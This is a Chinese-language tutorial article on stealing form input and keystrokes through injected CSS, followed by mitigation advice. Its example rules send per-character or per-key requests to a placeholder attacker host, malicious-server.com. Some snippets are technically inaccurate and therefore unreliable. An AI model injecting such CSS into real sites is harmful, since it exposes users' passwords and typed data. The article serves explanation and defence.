除了XSS跨站脚本攻击、CSRF跨站请求伪造之外，还有一种数据泄露方法是使用 CSS 窃取敏感信息，例如击键和用户输入。这种形式的攻击虽然比基于JavaScript 的攻击更难执行，但当 JavaScript 受到限制或禁用时可能特别危险。


# 了解 CSS 数据泄露


CSS传统上用于样式化网页，但当与其他前端技术结合时，它也可以用于读取用户交互。尽管CSS不像JavaScript那样具有执行代码或直接捕获数据的能力，但可以通过涉及CSS选择器、动画和服务器端日志记录来观测模式、推断用户输入或强制执行某些操作。


例如，CSS 可用于通过悬停效果、焦点状态，甚至根据用户交互触发更改的隐藏元素来跟踪用户行为。攻击者利用这些属性间接窃取输入到 Web 表单中的敏感信息，例如用户名或密码。


## 攻击者如何利用 CSS


攻击者可以利用跨站脚本 等漏洞或破坏外部样式表，将恶意CSS 注入网站。一旦 CSS 就位，它就可以跟踪或推断击键、鼠标移动和其他交互。尽管 CSS 无法直接记录数据，但它可以与服务器端日志或其他隐蔽通道相结合，将信息转发回攻击者。


### CSS 数据泄露中的关键概念

- CSS 选择器：攻击者可以使用伪类（如:focus或:hover来检测用户何时与表单元素交互。
- CSS 内容属性：当满足某些条件（例如，按下特定键时）时，恶意 CSS 可以插入内容或更新元素的内容。
- 远程字体加载：通过根据用户输入请求不同的字体文件，攻击者可以秘密地将数据发送回其服务器。

# 基于 CSS 的数据泄露的真实案例


虽然基于 CSS 的攻击不像基于 JavaScript 的攻击那样广为人知，但确实有一些已记录的案例显示 CSS 被用于恶意目的。其中一个较为知名的例子是一个名为“像素追踪”的安全漏洞，在这个漏洞中，CSS 被用于通过特定用户操作所触发的视觉变化来跟踪鼠标移动并检测键入的字符。


在其他情况，研究人员已经证明，通过使用 CSS 和字体请求的组合，可以通过为每次击键或表单交互创建唯一的请求来泄露用户数据。


## Pixel-Tracking


像素追踪是一种基于CSS的攻击，攻击者使用精心设计的CSS规则来监控单个表单字段的状态。通过跟踪用户何时与哪些字段交互，攻击者可以收集用户正在输入的内容的数据，尽管他并没有直接访问输入的数据。


```javascript
/* 使用悬停状态和内容插入进行CSS跟踪 */
input[type="text"]:hover::after {
    content: "Hovering on the input field!";
}
```


在上面的例子中，当用户将鼠标悬停在文本输入字段上时，会发生视觉变化。可以基于相同的原理进一步推导出更具体的行为，例如检测按键操作或根据用户输入选择特定的表单字段。


# 基本概念：CSS 如何被滥用


虽然 CSS 本质上无法访问数据，但它可以通过对用户输入的反应来提供有关用户活动的线索。在JavaScript受限的环境中，这对攻击者尤其有用。

1. 使用 CSS 选择器跟踪输入焦点

CSS 伪类如 :focus 或 :active 可以用于追踪用户何时聚焦到输入字段。通过将其与 CSS 动画或过渡效果结合，恶意行为者可以检测到用户的交互。


```javascript
/*检测用户何时聚焦于特定字段*/
input[type="password"]:focus {
    background-color: #ff0000;
}
```


在这个例子中，当密码字段获取焦点时，其背景颜色会发生变化，这可能向攻击者发出信号，表明用户正在输入敏感信息。


2. 监控表单提交


CSS本身不能跟踪表单提交，但它可以检测用户何时与表单字段互动。攻击者可能会将 CSS 与服务器日志结合使用，根据页面布局或样式的变化来确定何时提交了表单。


# 用于窃取数据的CSS 技术


虽然上述基本技术依赖于简单的用户交互，但更高级的CSS攻击使用复杂的方法来推断特定数据，例如单个击键或表单内容。这些技术通常涉及使用外部资源，如字体或背景图片，以向攻击者的服务器传递有价值的信息。

1. 远程字体加载

一种数据窃取方法是根据用户输入动态加载字体。通过将不同的字体与不同的用户动作（例如，按下特定键）关联起来，攻击者可以向他们的服务器传递特定的按键信息。


```javascript
/*根据输入字段的值加载不同的字体*/
input[type="text"][value^="a"] {
    font-family: url("http://malicious-server.com/font-a.woff");
}
input[type="text"][value^="b"] {
    font-family: url("http://malicious-server.com/font-b.woff");
}
```


在这种情况下，每当用户开始键入特定字符（例如“a”或“b”）时，浏览器就会请求不同的字体文件，该文件可以由攻击者的服务器记录。


2. 使用伪元素进行击键检测


通过使用诸如::after和::before之类的伪元素，攻击者可以根据用户操作动态插入内容。当与服务器端监控结合使用时，这种技术可以用来跟踪特定行为。


```javascript
/*在按下特定键时插入内容*/
input[data-key="13"]::after {
    content: "Enter key pressed!";
    background: url("http://malicious-server.com/enter_key_log.png");
}
```


在这个例子中，每当按下特定的键（例如回车键）时，就会触发一个外部图像或请求，从而使攻击者能够记录该动作。


# 缓解基于 CSS 的攻击


减轻这些风险的一些关键步骤：


1. 实施内容安全策略（CSP）


强大的内容安全策略（CSP）可以帮助防止恶意CSS在网页上加载。通过限制样式表加载的来源，可以阻止潜在的攻击者注入有害代码。


2. 验证和清理输入


始终验证和清理用户输入，以防止攻击者注入恶意代码，无论是 CSS 还是 JavaScript。通过限制输入字段可以接受的内容，可以限制恶意行为者可用的攻击媒介。


3.使用强大的访问控制策略


确保只有受信任的用户才能上传或修改 CSS 文件。在许多情况下，攻击者利用 XSS 漏洞或访问控制中的其他弱点插入恶意样式表。实施严格的访问控制，降低CSS注入的风险


4.定期审查样式表


定期对Web应用程序中的所有CSS文件进行审查和审核。确保没有添加未经授权的或可疑的样式。通过监控和限制使用的CSS文件及其使用者，可以减少恶意样式被引入的可能性。
